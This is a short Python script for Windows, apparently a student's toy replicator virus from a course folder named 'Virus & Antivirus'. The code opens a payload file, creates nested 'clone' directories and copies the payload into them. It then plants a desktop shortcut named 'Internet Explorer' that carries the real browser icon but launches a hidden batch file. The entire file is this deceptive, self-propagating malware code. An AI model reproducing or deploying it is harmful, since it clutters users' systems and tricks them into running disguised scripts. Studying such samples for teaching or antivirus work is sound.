from sys import argv
import os
import webbrowser
import shutil
from win32com.client import Dispatch
import winshell
script= argv
name = str(script[0])
cmd = 'start payload.txt'
os.system(cmd)
for i in range(3):
	if os.path.exists("clone"):
		os.chdir('clone/')
		os.mkdir('clone')
		os.system(r"copy payload.txt clone")
		#shutil.copyfile('replicator.py', 'clone/replicator.py')
	else:	
		os.mkdir('clone')
		os.system(r"copy payload.txt clone")		
#os.system(r"copy"+ name +"clone")
desktop = winshell.desktop()	# call the desktop
path = os.path.join(desktop,"Internet Explorer.lnk")
target = r"D:\\Msc Software Engineering\\First Semester\\Software Optimization\\Virus & Antivirus\\replicator\\launch.bat"
wDir = r"D:\\Msc Software Engineering\\First Semester\\Software Optimization\\Virus & Antivirus\\replicator"
icon = r"C:\\Program Files\\Internet Explorer\\iexplore.exe"

shell = Dispatch('Wscript.shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()

